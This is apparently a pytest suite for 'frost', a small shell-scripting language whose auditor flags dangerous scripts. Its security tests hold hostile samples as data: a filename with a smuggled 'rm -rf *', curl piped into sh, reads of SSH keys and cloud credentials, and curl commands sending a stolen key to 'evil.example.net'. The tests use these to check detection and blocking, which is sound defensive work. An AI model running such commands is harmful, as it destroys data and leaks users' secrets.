"""Test suite for frost. Run with: python3 -m pytest tests/ -q"""

import io
import os
import sys
import textwrap

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from frostlang.parser import parse, ParseError
from frostlang.lexer import tokenize, LexError
from frostlang.interp import Interpreter, FrostError


def run(src, argv=None, cwd=None):
    """Run a script, return (stdout, exit status)."""
    src = textwrap.dedent(src)
    tree = parse(src)
    interp = Interpreter(argv=argv or [], cwd=cwd)
    old = sys.stdout
    sys.stdout = io.StringIO()
    try:
        status = interp.run_program(tree)
        return sys.stdout.getvalue(), status
    finally:
        sys.stdout = old


def out(src, **kw):
    return run(src, **kw)[0].strip()


# ------------------------------------------------------------------ lexing

def test_comments_both_styles():
    assert out('-- a\n# b\nput "x"') == "x"


def test_shebang_is_skipped():
    assert out('#!/usr/bin/env frost\nput "x"') == "x"


def test_unterminated_string():
    with pytest.raises(LexError):
        tokenize('put "oops')


def test_escapes():
    assert out(r'put "a\tb"') == "a\tb"


# ------------------------------------------------- multi-word identifiers

def test_multiword_variable():
    assert out('put 5 into error count\nput error count') == "5"


def test_variable_starting_with_chunk_noun():
    # `line count` must be a legal name even though `line` is a chunk noun.
    assert out('put 7 into line count\nput line count') == "7"


def test_variable_named_word_total():
    assert out('put 2 into word total\nadd 3 to word total\nput word total') == "5"


def test_undefined_variable_is_an_error():
    with pytest.raises(FrostError) as e:
        run("put nothing here")
    assert "no variable named" in e.value.msg


# ------------------------------------------------------ chunk expressions

CHUNKY = 'put "alpha beta gamma delta" into s\n'


def test_ordinal_word():
    assert out(CHUNKY + "put the first word of s") == "alpha"
    assert out(CHUNKY + "put the third word of s") == "gamma"


def test_last_and_middle():
    assert out(CHUNKY + "put the last word of s") == "delta"
    assert out(CHUNKY + "put the middle word of s") == "beta"


def test_numeric_index():
    assert out(CHUNKY + "put word 2 of s") == "beta"
    assert out(CHUNKY + "put the word 4 of s") == "delta"


def test_word_range():
    assert out(CHUNKY + "put words 2 to 3 of s") == "beta gamma"


def test_negative_index_counts_from_end():
    assert out(CHUNKY + "put word -1 of s") == "delta"


def test_out_of_range_is_empty_not_an_error():
    assert out(CHUNKY + "put word 99 of s") == ""


def test_article_is_optional_on_ordinal_chunks():
    assert out(CHUNKY + "put first word of s") == "alpha"
    assert out(CHUNKY + "put last word of s") == "delta"
    assert out(CHUNKY + "put any word of s") in ["alpha", "beta", "gamma",
                                                 "delta"]


def test_ordinal_words_still_work_as_names():
    # `last name` must not be mistaken for a chunk expression.
    assert out('put "Bell" into last name\nput last name') == "Bell"
    assert out('put 1 into first attempt\nput first attempt') == "1"


def test_items_are_comma_delimited():
    src = 'put "a, b, c" into s\nput the second item of s'
    assert out(src) == "b"


def test_characters():
    src = 'put "frost" into s\nput characters 1 to 3 of s'
    assert out(src) == "fro"


def test_number_of():
    assert out(CHUNKY + "put the number of words in s") == "4"
    assert out(r'put "a\nb\nc" into s' + "\nput the number of lines in s") == "3"


def test_length_of():
    assert out('put "abc" into s\nput the length of s') == "3"


def test_nested_chunks(tmp_path):
    f = tmp_path / "log.txt"
    f.write_text("one two three\nfour five six\nseven eight nine\n")
    src = f'put the second word of line 3 of file "{f}"'
    assert out(src) == "eight"


def test_chunk_of_empty_string():
    assert out('put "" into s\nput the number of lines in s') == "0"


# --------------------------------------------------------------- operators

def test_concatenation():
    assert out('put "a" & "b"') == "ab"
    assert out('put "a" && "b"') == "a b"


def test_arithmetic_and_precedence():
    assert out("put 2 + 3 * 4") == "14"
    assert out("put (2 + 3) * 4") == "20"


def test_division_by_zero():
    with pytest.raises(FrostError):
        run("put 1 / 0")


def test_comparisons_word_forms():
    assert out("put 5 is greater than 3") == "true"
    assert out("put 5 is at least 5") == "true"
    assert out("put 2 is less than 1") == "false"
    assert out('put "abc" contains "b"') == "true"
    assert out('put "abc" starts with "a"') == "true"
    assert out('put "abc" ends with "z"') == "false"
    assert out('put "" is empty') == "true"


def test_is_not():
    assert out("put 1 is not 2") == "true"


def test_numeric_strings_compare_numerically():
    assert out('put "10" is greater than "9"') == "true"


def test_logical_operators():
    assert out("put true and false") == "false"
    assert out("put true or false") == "true"
    assert out("put not false") == "true"


# -------------------------------------------------------------- statements

def test_put_before_and_after():
    src = 'put "b" into s\nput "c" after s\nput "a" before s\nput s'
    assert out(src) == "abc"


def test_add_subtract_multiply_divide():
    assert out("put 10 into n\nadd 5 to n\nput n") == "15"
    assert out("put 10 into n\nsubtract 4 from n\nput n") == "6"
    assert out("put 10 into n\nmultiply 3 into n\nput n") == "30"
    assert out("put 10 into n\ndivide 4 into n\nput n") == "2.5"


def test_if_else_chain():
    src = """
    put 5 into n
    if n is greater than 10 then
        put "big"
    else if n is greater than 3 then
        put "medium"
    else
        put "small"
    end if
    """
    assert out(src) == "medium"


def test_single_line_if():
    assert out('put 1 into n\nif n is 1 then put "yes"') == "yes"


def test_repeat_times():
    assert out('repeat 3 times\n    put "x"\nend repeat') == "x\nx\nx"


def test_repeat_with_range():
    assert out("repeat with i from 1 to 3\n    put i\nend repeat") == "1\n2\n3"


def test_repeat_with_step_down():
    src = "repeat with i from 3 to 1 by -1\n    put i\nend repeat"
    assert out(src) == "3\n2\n1"


def test_repeat_for_each():
    src = """
    put "a,b,c" into s
    repeat for each item in s as piece
        put piece
    end repeat
    """
    assert out(src) == "a\nb\nc"


def test_repeat_while_and_exit():
    src = """
    put 0 into n
    repeat while n is less than 10
        add 1 to n
        if n is 3 then exit repeat
    end repeat
    put n
    """
    assert out(src) == "3"


def test_next_repeat_skips():
    src = """
    repeat with i from 1 to 4
        if i is 2 then next repeat
        put i
    end repeat
    """
    assert out(src) == "1\n3\n4"


def test_quit_with_status():
    _, status = run('put "bye"\nquit with status 3')
    assert status == 3


def test_handler_with_return():
    src = """
    to double with n
        return n * 2
    end double

    double with 21
    put it
    """
    assert out(src) == "42"


def test_handler_arity_is_checked():
    src = "to f with a, b\n    return a\nend f\nf with 1"
    with pytest.raises(FrostError) as e:
        run(src)
    assert "expects 2" in e.value.msg


def test_handler_locals_do_not_leak():
    src = """
    to helper with x
        put x into scratch
        return x
    end helper

    helper with 1
    put "ok"
    """
    assert out(src) == "ok"


# ---------------------------------------------------------------- processes

def test_run_captures_stdout_into_it():
    assert out('run "echo" with "hi"\nput it') == "hi"


def test_run_sets_the_result():
    assert out('try to run "false"\nput the result') == "1"


def test_unchecked_failure_aborts():
    with pytest.raises(FrostError) as e:
        run('run "false"\nput "never"')
    assert "failed with status 1" in e.value.msg


def test_try_to_run_does_not_abort():
    assert out('try to run "false"\nput "still here"') == "still here"


def test_missing_program_is_a_clear_error():
    with pytest.raises(FrostError) as e:
        run('run "definitely-not-a-real-program-xyz"')
    assert "no program named" in e.value.msg


def test_arguments_are_never_reparsed(tmp_path):
    """The core safety property: a value can never become syntax."""
    evil = "notes.txt; rm -rf *"
    src = f'''
    put "{evil}" into evil name
    run "touch" with evil name
    '''
    run(src, cwd=str(tmp_path))
    survivors = os.listdir(tmp_path)
    assert evil in survivors


def test_spaces_in_filenames_need_no_quoting(tmp_path):
    src = 'run "touch" with "my file.txt"'
    run(src, cwd=str(tmp_path))
    assert os.listdir(tmp_path) == ["my file.txt"]


def test_run_with_a_command_line_is_rejected():
    with pytest.raises(ParseError) as e:
        parse('run "ls -la"')
    assert "not a command line" in e.value.msg
    assert 'with "-la"' in e.value.hint


def test_pipe_chains_stages():
    src = """
    pipe
        run "printf" with "b\\na\\nc\\n"
        run "sort"
    end pipe
    put it
    """
    assert out(src) == "a\nb\nc"


def test_pipe_reports_failure_of_a_middle_stage():
    """bash's default would report success here. That is the bug."""
    src = """
    try to pipe
        run "cat" with "/nonexistent-file-xyz"
        run "wc" with "-l"
    end pipe
    put the result
    """
    assert out(src) != "0"


def test_pipe_needs_two_stages():
    with pytest.raises(ParseError):
        parse('pipe\n    run "ls"\nend pipe')


def test_pipe_stages_must_be_runs():
    with pytest.raises(ParseError) as e:
        parse('pipe\n    put "x"\n    run "ls"\nend pipe')
    assert "must be a 'run'" in e.value.msg


# --------------------------------------------------------------------- files

def test_write_and_read_file(tmp_path):
    p = tmp_path / "out.txt"
    src = f'''
    put "hello" into file "{p}"
    put file "{p}"
    '''
    assert out(src) == "hello"


def test_append_to_file(tmp_path):
    p = tmp_path / "log.txt"
    src = f'''
    put "one" into file "{p}"
    put "two" after file "{p}"
    put the number of lines in file "{p}"
    '''
    assert out(src) == "2"


def test_file_exists(tmp_path):
    p = tmp_path / "here.txt"
    p.write_text("x")
    assert out(f'put file "{p}" exists') == "true"
    assert out(f'put file "{tmp_path}/nope.txt" exists') == "false"


def test_missing_file_is_a_clear_error(tmp_path):
    with pytest.raises(FrostError) as e:
        run(f'put file "{tmp_path}/nope.txt"')
    assert "no file at" in e.value.msg


def test_delete_file(tmp_path):
    p = tmp_path / "gone.txt"
    p.write_text("x")
    run(f'delete file "{p}"')
    assert not p.exists()


# ----------------------------------------------------------------- specials

def test_arguments():
    src = """
    put the number of items in the arguments
    put item 1 of the arguments
    """
    assert out(src, argv=["alpha", "beta"]) == "2\nalpha"


def test_environment_variable():
    os.environ["FROST_TEST_VAR"] = "set-value"
    assert out('put the environment variable "FROST_TEST_VAR"') == "set-value"


def test_missing_env_var_is_empty():
    assert out('put the environment variable "NO_SUCH_VAR_XYZ" is empty') == "true"


# ------------------------------------------------------------ parse errors

@pytest.mark.parametrize("src", [
    'if 1 is 1\n    put "x"\nend if',        # missing 'then'
    'repeat with i from 1 to 3\n    put i',  # missing 'end repeat'
    'put the frobnitz of "x"',               # unknown property
    'put "a" into',                          # missing target
    'to f\n    put "x"\nend g',              # mismatched handler name
])
def test_syntax_errors_are_caught(src):
    with pytest.raises(ParseError):
        parse(src)


def test_parse_errors_carry_a_line_number():
    with pytest.raises(ParseError) as e:
        parse('put "ok"\nput "ok"\nput the frobnitz of "x"')
    assert e.value.line == 3


# ------------------------------------------------- loop control is lexical

def test_exit_repeat_outside_a_loop_is_rejected():
    with pytest.raises(ParseError) as e:
        parse('exit repeat')
    assert "not inside a repeat" in e.value.msg


def test_loop_control_cannot_cross_a_handler_boundary():
    src = """
    to check with n
        if n is 2 then exit repeat
    end check

    repeat with i from 1 to 4
        check with i
    end repeat
    """
    with pytest.raises(ParseError):
        parse(textwrap.dedent(src))


def test_a_loop_inside_a_handler_is_fine():
    src = """
    to find target with text
        repeat for each word in text as w
            if w is "two" then return w
        end repeat
        return "none"
    end find target

    find target with "one two three"
    put it
    """
    assert out(src) == "two"


def test_nested_loops_exit_only_the_inner_one():
    src = """
    put 0 into hits
    repeat with i from 1 to 3
        repeat with j from 1 to 3
            if j is 2 then exit repeat
            add 1 to hits
        end repeat
    end repeat
    put hits
    """
    assert out(src) == "3"


# ---------------------------------------------------------- pattern matching

def test_backslash_escapes_survive_for_regex():
    # `\d` must not be eaten by the lexer.
    assert out(r'put "^\d+"') == r"^\d+"


def test_known_escapes_still_translate():
    assert out(r'put the number of lines in "a\nb"') == "2"


def test_matches_is_a_boolean():
    assert out(r'put "abc123" matches "\d+"') == "true"
    assert out(r'put "abc" matches "\d+"') == "false"


def test_matches_is_anchored_only_when_asked():
    assert out(r'put "xabc" matches "^abc"') == "false"
    assert out(r'put "abcx" matches "^abc"') == "true"


def test_capture_groups():
    src = r'''
    put "10.0.0.42 POST 500" into request
    if request matches "^(\S+) (\w+) (\d+)$" then
        put match 1
        put match 2
        put the last match
        put the number of matches
    end if
    '''
    assert out(src) == "10.0.0.42\nPOST\n500\n3"


def test_whole_match():
    src = r'''
    if "order-4471-final" matches "\d+" then
        put the whole match
    end if
    '''
    assert out(src) == "4471"


def test_failed_match_clears_groups():
    src = r'''
    if "abc" matches "(\d+)" then
        put "matched"
    end if
    put the number of matches
    '''
    assert out(src) == "0"


def test_unmatched_optional_group_is_empty_not_missing():
    src = r'''
    if "abc" matches "(a)(x)?(b)" then
        put "[" & match 2 & "]"
    end if
    '''
    assert out(src) == "[]"


def test_is_like_glob():
    assert out('put "report.tmp" is like "*.tmp"') == "true"
    assert out('put "report.txt" is like "*.tmp"') == "false"
    assert out('put "log-2026-08.txt" is like "log-????-??.txt"') == "true"


def test_is_not_like():
    assert out('put "a.txt" is not like "*.tmp"') == "true"


def test_glob_is_case_sensitive():
    assert out('put "REPORT.TMP" is like "*.tmp"') == "false"


def test_every_match_returns_a_list():
    src = r'''
    put every match of "\d+" in "a1 b22 c333" into numbers
    put the number of items in numbers
    put item 3 of numbers
    '''
    assert out(src) == "3\n333"


def test_every_match_with_no_hits_is_empty():
    src = r'put the number of items in every match of "\d+" in "abc"'
    assert out(src) == "0"


def test_replace_with_backreferences():
    src = r'''
    put "2026-08-09" into date text
    replace "(\d+)-(\d+)-(\d+)" with "\3/\2/\1" in date text
    put date text
    '''
    assert out(src) == "09/08/2026"


def test_replace_is_global():
    src = '''
    put "a-b-c" into s
    replace "-" with "+" in s
    put s
    '''
    assert out(src) == "a+b+c"


def test_invalid_pattern_is_a_clear_error():
    with pytest.raises(FrostError) as e:
        run(r'put "x" matches "(unclosed"')
    assert "not a valid pattern" in e.value.msg


def test_matching_works_inside_a_loop():
    src = r'''
    put 0 into hits
    repeat for each line in "a1\nbb\nc3" as row
        if row matches "\d" then add 1 to hits
    end repeat
    put hits
    '''
    assert out(src) == "2"


# ------------------------------------------------------------------ timeouts

def test_fast_command_under_timeout_succeeds():
    assert out('run "sleep" with "0.05" within 5 seconds\nput the result') == "0"


def test_slow_command_times_out_with_124():
    src = '''
    try to run "sleep" with "10" within 200 milliseconds
    put the result
    '''
    assert out(src) == "124"


def test_unchecked_timeout_aborts_the_script():
    with pytest.raises(FrostError) as e:
        run('run "sleep" with "10" within 200 milliseconds')
    assert "ran longer than" in e.value.msg


def test_pipe_timeout():
    src = '''
    try to pipe within 200 milliseconds
        run "sleep" with "10"
        run "wc" with "-l"
    end pipe
    put the result
    '''
    assert out(src) == "124"


def test_timeout_units():
    for clause in ["within 1 second", "within 1 seconds", "within 2 minutes",
                   "within 500 milliseconds", "within 100 ms",
                   "within 1 hour"]:
        parse(f'run "true" {clause}')


def test_timeout_requires_a_unit():
    with pytest.raises(ParseError) as e:
        parse('run "sleep" with "1" within 5')
    assert "needs a unit" in e.value.msg


def test_timeout_must_be_positive():
    with pytest.raises(FrostError):
        run('run "true" within 0 seconds')


def test_timeout_belongs_on_the_pipe_not_a_stage():
    src = '''
    pipe
        run "echo" with "x" within 1 second
        run "cat"
    end pipe
    '''
    with pytest.raises(ParseError) as e:
        parse(textwrap.dedent(src))
    assert "on the pipe" in e.value.msg


def test_match_is_still_usable_as_a_variable_name():
    assert out('put 3 into match count\nput match count') == "3"


# -------------------------------------------------------- static analysis

from frostlang.audit import (audit, describe, parse_policy, check,
                             PolicyError)


def caps_for(src):
    return audit(parse(textwrap.dedent(src)))


def test_manifest_lists_programs():
    c = caps_for('run "git" with "status"\nrun "make"')
    assert sorted(x.program for x in c.commands) == ["git", "make"]


def test_manifest_sees_pipe_stages():
    c = caps_for('''
    pipe
        run "cat" with "a.txt"
        run "wc" with "-l"
    end pipe
    ''')
    assert sorted(x.program for x in c.commands) == ["cat", "wc"]
    assert all(x.in_pipe for x in c.commands)


def test_manifest_sees_inside_loops_and_handlers():
    c = caps_for('''
    to helper
        run "hostname"
    end helper

    repeat 3 times
        run "uptime"
    end repeat
    ''')
    assert sorted(x.program for x in c.commands) == ["hostname", "uptime"]


def test_manifest_records_file_access():
    c = caps_for('''
    put file "in.txt" into data
    put data into file "out.txt"
    delete file "old.txt"
    ''')
    assert ("in.txt", 2) in c.reads
    assert ("out.txt", 3) in c.writes
    assert ("old.txt", 4) in c.deletes


def test_exists_check_is_not_double_counted():
    c = caps_for('if file "x.txt" exists then put "yes"')
    assert len(c.reads) == 1


def test_runtime_built_names_are_flagged_not_guessed():
    c = caps_for('''
    put item 1 of the arguments into program
    run program with "--help"
    ''')
    assert c.commands[0].program is None
    assert c.dynamic == 1


def test_concatenated_literals_are_resolved():
    c = caps_for('put "x" into file "logs/" & "run.txt"')
    assert c.writes[0][0] == "logs/run.txt"


def test_describe_is_readable():
    text = describe(caps_for('run "git" with "push"'))
    assert "Runs these programs" in text
    assert "git" in text


# -- policy

POLICY = '''
forbid running "rm" with "-rf"
warn running "curl"
forbid writing to "/etc/*"
require timeout on "curl"
require every command to be checked
'''


def test_policy_blocks_dangerous_command():
    rules = parse_policy(POLICY)
    f = check(caps_for('run "rm" with "-rf", "/tmp/x"'), rules)
    assert any(sev == "forbid" and "rm" in what for sev, what, _ in f)


def test_policy_allows_the_same_program_with_other_arguments():
    rules = parse_policy(POLICY)
    f = check(caps_for('run "rm" with "one file.txt"'), rules)
    assert not [x for x in f if x[0] == "forbid"]


def test_policy_blocks_protected_paths():
    rules = parse_policy(POLICY)
    f = check(caps_for('put "x" into file "/etc/passwd"'), rules)
    assert any("writing to /etc/passwd" in what for _, what, _ in f)


def test_policy_warning_does_not_block():
    rules = parse_policy(POLICY)
    f = check(caps_for('run "curl" with "-s", "http://x" within 5 seconds'),
              rules)
    assert [x for x in f if x[0] == "warn"]
    assert not [x for x in f if x[0] == "forbid"]


def test_missing_timeout_is_caught():
    rules = parse_policy('require timeout on "curl"')
    f = check(caps_for('run "curl" with "http://x"'), rules)
    assert any("no timeout" in what for _, what, _ in f)


def test_checked_rule_understands_a_result_check():
    """`try to run` followed by reading the result is correct, not a violation."""
    rules = parse_policy("require every command to be checked")
    src = '''
    try to run "ping" with "-c", "1", "example.com"
    if the result is not 0 then
        put "unreachable"
    end if
    '''
    assert check(caps_for(src), rules) == []


def test_checked_rule_catches_a_genuinely_ignored_failure():
    rules = parse_policy("require every command to be checked")
    src = '''
    try to run "ping" with "-c", "1", "example.com"
    put "carrying on regardless"
    '''
    f = check(caps_for(src), rules)
    assert any("without being checked" in what for _, what, _ in f)


def test_policy_line_numbers_point_at_the_script():
    rules = parse_policy('forbid running "rm" with "-rf"')
    src = 'put "a"\nput "b"\nrun "rm" with "-rf", "x"'
    f = check(audit(parse(src)), rules)
    assert f[0][2] == 3


def test_unreadable_policy_line_is_reported():
    with pytest.raises(PolicyError):
        parse_policy("please do not delete anything")


def test_policy_comments_are_ignored():
    rules = parse_policy('-- a note\n# another\nforbid running "dd"')
    assert len(rules) == 1


# ------------------------------------------------- built-in danger checks

from frostlang.audit import (find_dangers, summarise, verdict, classify_path,
                             Finding)


def dangers_for(src):
    return find_dangers(caps_for(src))


def titles(src):
    return [f.title for f in dangers_for(src)]


def test_rm_rf_is_a_danger():
    f = dangers_for('run "rm" with "-rf", "/tmp/x"')
    assert any(x.severity == "danger" and "Recursive forced" in x.title
               for x in f)


def test_rm_r_alone_is_only_a_caution():
    f = dangers_for('run "rm" with "-r", "/tmp/x"')
    assert [x.severity for x in f if "Recursive" in x.title] == ["caution"]


def test_plain_rm_is_not_flagged():
    assert not [x for x in dangers_for('run "rm" with "one file.txt"')
                if x.severity == "danger"]


def test_wildcard_delete_is_flagged():
    assert any("wildcard" in t for t in titles('run "rm" with "*.tmp"'))


def test_sudo_is_a_danger():
    assert any("Elevated" in t for t in titles('run "sudo" with "ls"'))


def test_chmod_777_is_a_danger():
    assert any("permission" in t for t in titles('run "chmod" with "777", "/x"'))


def test_shell_escape_is_flagged():
    assert any("Shell escape" in t
               for t in titles('run "sh" with "-c", "echo hi"'))


def test_network_program_is_noted():
    f = dangers_for('run "curl" with "https://example.com" within 5 seconds')
    assert any(x.severity == "note" and "network" in x.title for x in f)


def test_network_without_timeout_is_a_caution():
    f = dangers_for('run "curl" with "https://example.com"')
    assert any("No timeout" in x.title and x.severity == "caution" for x in f)


def test_network_with_timeout_has_no_timeout_caution():
    f = dangers_for('run "curl" with "https://x" within 5 seconds')
    assert not any("No timeout" in x.title for x in f)


def test_curl_piped_into_shell_is_the_worst_case():
    src = '''
    pipe
        run "curl" with "https://install.example.com/x.sh"
        run "sh"
    end pipe
    '''
    assert any("piped into a shell" in t for t in titles(src))


def test_write_to_system_location_is_a_danger():
    assert any("system location" in t
               for t in titles('put "x" into file "/etc/thing.conf"'))


def test_write_to_tmp_is_not_a_danger():
    assert not [x for x in dangers_for('put "x" into file "/tmp/thing"')
                if x.severity == "danger"]


def test_reading_credentials_is_flagged():
    assert any("credentials" in t
               for t in titles('put file "~/.ssh/id_rsa" into key'))


def test_runtime_program_name_is_a_caution():
    src = 'put "ls" into tool\nrun tool with "-l"'
    assert any("built at runtime" in t for t in titles(src))


def test_path_classification():
    assert classify_path("/etc/passwd") == "system"
    assert classify_path("/tmp/x") == "temporary"
    assert classify_path("~/notes.txt") == "home"
    assert classify_path("notes.txt") == "relative"
    assert classify_path(None) == "runtime"


# -- verdicts and summary

def test_clean_script_has_a_clean_verdict():
    assert verdict(dangers_for('run "echo" with "hello"')) == "clean"


def test_dangerous_script_has_a_dangerous_verdict():
    assert verdict(dangers_for('run "rm" with "-rf", "/"')) == "dangerous"


def test_policy_refusal_outranks_everything():
    caps = caps_for('run "rm" with "-rf", "/tmp/x"')
    hits = check(caps, parse_policy('forbid running "rm" with "-rf"'))
    assert verdict(find_dangers(caps), hits) == "blocked"


def test_summary_reads_as_a_sentence():
    src = '''
    put file "in.txt" into data
    run "curl" with "https://x" within 5 seconds
    put data into file "/tmp/out.txt"
    quit with status 1
    '''
    text = summarise(caps_for(src))
    assert text.startswith("This script ")
    assert text.endswith(".")
    assert "curl" in text and "internet" in text
    assert "reads 1 file" in text and "writes 1 file" in text


def test_summary_of_an_inert_script():
    assert "nothing observable" in summarise(caps_for('put "hi"'))


def test_the_three_demo_scripts_land_as_intended():
    """The audit page depends on these verdicts staying put."""
    import os
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    rules = parse_policy(
        open(os.path.join(here, "examples", "production.policy")).read())
    expected = {"healthcheck.frost": "clean",
                "logreport.frost": "clean",
                "danger.frost": "blocked"}
    for name, want in expected.items():
        src = open(os.path.join(here, "examples", name)).read()
        caps = audit(parse(src))
        got = verdict(find_dangers(caps), check(caps, rules))
        assert got == want, f"{name}: expected {want}, got {got}"


# ------------------------------------------------------------- scratchpad

import io as _io
from frostlang.repl import Repl


def repl_lines(*lines, subject=None):
    out = _io.StringIO()
    r = Repl(subject=subject, out=out)
    for line in lines:
        r.handle(line)
    return out.getvalue().strip().split("\n")


def test_repl_evaluates_a_chunk_expression():
    assert repl_lines("the first word of it",
                      subject="alpha beta") == ["alpha"]


def test_repl_nested_chunks():
    assert repl_lines("the second word of line 2 of it",
                      subject="a b\nc d") == ["d"]


def test_repl_renders_a_list_with_a_count():
    out = repl_lines(r'every match of "\d+" in it', subject="a1 b22")
    assert out == ["2 items: 1, 22"]


def test_repl_renders_empty_clearly():
    assert repl_lines("word 99 of it", subject="a b") == ["(empty)"]


def test_repl_accepts_statements_too():
    out = repl_lines('put "x" into greeting', "greeting", subject="")
    assert out[-1] == "x"


def test_repl_prefers_the_expression_error():
    out = repl_lines("the frobnitz of it", subject="a")
    assert "must be followed by a property or chunk" in out[0]


def test_repl_commands():
    out = repl_lines(":text one two three", "the last word of it")
    assert out[-1] == "three"


def test_repl_quit_stops():
    r = Repl(out=_io.StringIO())
    assert r.handle(":quit") is False


def test_repl_unknown_command_is_reported():
    assert "unknown command" in repl_lines(":nope")[0]


# -------------------------------------------------------------- formatter

from frostlang.formatter import format_source

MESSY = '''
put   "a"    into greeting


   put 1 into counter
if counter is greater than 0 then
put greeting  -- keep me
    repeat with i from 1 to 3
add 1 to counter
        end repeat
  else
      put "nothing"
end if
run "echo" with "a","b" ,  "c"
'''


def tree_shape(src):
    import re as _re
    import pprint as _pp
    return _re.sub(r"line=\d+", "line=?", _pp.pformat(parse(src)))


def test_formatter_indents_blocks():
    out = format_source(MESSY)
    assert "\n    put greeting" in out
    assert "\n        add 1 to counter" in out
    assert "\nend if" in out


def test_formatter_keeps_comments():
    assert "-- keep me" in format_source(MESSY)


def test_formatter_normalises_argument_spacing():
    assert 'run "echo" with "a", "b", "c"' in format_source(MESSY)


def test_formatter_is_idempotent():
    once = format_source(MESSY)
    assert format_source(once) == once


def test_formatter_does_not_change_meaning():
    assert tree_shape(MESSY) == tree_shape(format_source(MESSY))


def test_formatter_collapses_blank_runs_to_one():
    assert "\n\n\n" not in format_source(MESSY)


def test_formatter_keeps_the_shebang_first():
    src = '#!/usr/bin/env frost\nput "x"\n'
    assert format_source(src).startswith("#!/usr/bin/env frost\nput")


def test_formatter_refuses_a_broken_script():
    with pytest.raises((ParseError, LexError)):
        format_source('if 1 is 1\n  put "x"\n')


def test_formatter_does_not_touch_string_contents():
    src = 'put "  keep   inner  spacing  "\n'
    assert '"  keep   inner  spacing  "' in format_source(src)


def test_formatter_leaves_a_comment_only_line_at_block_depth():
    src = 'if 1 is 1 then\n-- note\nput "x"\nend if\n'
    out = format_source(src)
    assert "\n    -- note" in out


@pytest.mark.parametrize("name", ["hello", "logreport", "deploy", "backup",
                                  "healthcheck", "danger", "tour"])
def test_every_example_is_already_formatted(name):
    """The examples double as the formatter's style reference."""
    import os
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    path = os.path.join(here, "examples", f"{name}.frost")
    src = open(path).read()
    assert format_source(src) == src, f"{name}.frost is not canonically formatted"


# ---------------------------------------------- secret + exfiltration checks

def test_secret_path_behind_a_variable_prefix_is_caught():
    # The path is never a whole literal; only the ".ssh/id_rsa" tail is.
    src = '''
    put the environment variable "HOME" into home
    put file (home & "/.ssh/id_rsa") into key
    '''
    assert any("credentials" in t.lower() for t in titles(src))


def test_literal_secret_path_still_caught():
    assert any("credentials" in t.lower()
               for t in titles('put file "/home/me/.aws/credentials" into k'))


def test_pem_and_key_files_are_secrets():
    assert any("credentials" in t.lower()
               for t in titles('put file "server.pem" into cert'))


def test_ordinary_file_read_is_not_a_secret():
    assert not any("credentials" in t.lower()
                   for t in titles('put file "notes.txt" into n'))


def test_secret_env_var_is_flagged():
    src = 'put the environment variable "GITHUB_TOKEN" into t'
    assert any("secret from the environment" in t for t in titles(src))


def test_ordinary_env_var_is_not_flagged():
    src = 'put the environment variable "HOME" into h'
    assert not any("secret" in t.lower() for t in titles(src))


def test_exfiltration_pattern_is_the_headline_finding():
    src = '''
    put file "/home/me/.ssh/id_rsa" into key
    try to run "curl" with "--data", key, "https://evil.example.net" within 5 seconds
    '''
    f = dangers_for(src)
    assert any(x.severity == "danger" and "Secrets read" in x.title for x in f)


def test_secrets_without_network_is_not_exfiltration():
    # Reading a key to use it locally is normal; no theft finding.
    src = 'put file "/home/me/.ssh/id_rsa" into key\nput the length of key'
    assert not any("Secrets read, then" in t for t in titles(src))


def test_network_without_secrets_is_not_exfiltration():
    src = 'run "curl" with "https://example.com" within 5 seconds'
    assert not any("Secrets read, then" in t for t in titles(src))


def test_env_secret_plus_network_is_exfiltration():
    src = '''
    put the environment variable "AWS_SECRET_ACCESS_KEY" into k
    try to run "curl" with "--data", k, "https://x.example" within 5 seconds
    '''
    assert any("Secrets read, then" in t for t in titles(src))


def test_the_four_demo_scripts_land_as_intended():
    """The audit page depends on these staying put."""
    import os
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    rules = parse_policy(
        open(os.path.join(here, "examples", "production.policy")).read())
    expected = {"exfiltrate.frost": "blocked",
                "danger.frost": "blocked",
                "healthcheck.frost": "clean",
                "logreport.frost": "clean"}
    for name, want in expected.items():
        src = open(os.path.join(here, "examples", name)).read()
        caps = audit(parse(src))
        got = verdict(find_dangers(caps), check(caps, rules))
        assert got == want, f"{name}: expected {want}, got {got}"


def test_no_benign_script_reports_exfiltration():
    import os, glob
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    for path in glob.glob(os.path.join(here, "examples", "*.frost")):
        if os.path.basename(path) in ("exfiltrate.frost",):
            continue
        caps = audit(parse(open(path).read()))
        assert not any("Secrets read, then" in f.title
                       for f in find_dangers(caps)), path


# ----------------------------------------------- real external commands
#
# These shell out to `sleep`, `true`, `false` and `echo`. They are skipped
# where those are not available (chiefly Windows without a POSIX layer).

import shutil
import time as _time

_HAS_SLEEP = shutil.which("sleep") is not None
_HAS_COREUTILS = all(shutil.which(c) for c in ("true", "false", "echo"))

needs_sleep = pytest.mark.skipif(not _HAS_SLEEP, reason="no 'sleep' on PATH")
needs_coreutils = pytest.mark.skipif(
    not _HAS_COREUTILS, reason="no true/false/echo on PATH")


@needs_sleep
def test_timeout_actually_interrupts_a_slow_command():
    """A 200ms deadline on a 10s sleep must return in well under a second."""
    start = _time.monotonic()
    with pytest.raises(FrostError) as e:
        run('run "sleep" with "10" within 200 milliseconds')
    elapsed = _time.monotonic() - start
    assert elapsed < 2.0, f"timeout did not interrupt the child ({elapsed:.2f}s)"
    assert "ran longer than" in e.value.msg


@needs_sleep
def test_timeout_sets_status_124_and_keeps_running():
    src = '''
    try to run "sleep" with "10" within 200 milliseconds
    put the result
    put "still here"
    '''
    start = _time.monotonic()
    text = out(src)
    elapsed = _time.monotonic() - start
    assert elapsed < 2.0
    assert text == "124\nstill here"


@needs_sleep
def test_a_command_that_finishes_within_its_deadline_succeeds():
    src = '''
    run "sleep" with "0.05" within 5 seconds
    put the result
    '''
    assert out(src) == "0"


@needs_sleep
def test_pipe_timeout_interrupts_and_reaps():
    """The whole pipe has one deadline; a slow stage must not hang the run."""
    src = '''
    try to pipe within 200 milliseconds
        run "sleep" with "10"
        run "wc" with "-l"
    end pipe
    put the result
    '''
    start = _time.monotonic()
    assert out(src) == "124"
    assert _time.monotonic() - start < 2.0


@needs_sleep
def test_no_orphan_processes_after_a_timeout():
    """Killed children must be reaped, not left running in the background."""
    import subprocess
    before = subprocess.run(["pgrep", "-c", "sleep"], capture_output=True,
                            text=True).stdout.strip() or "0"
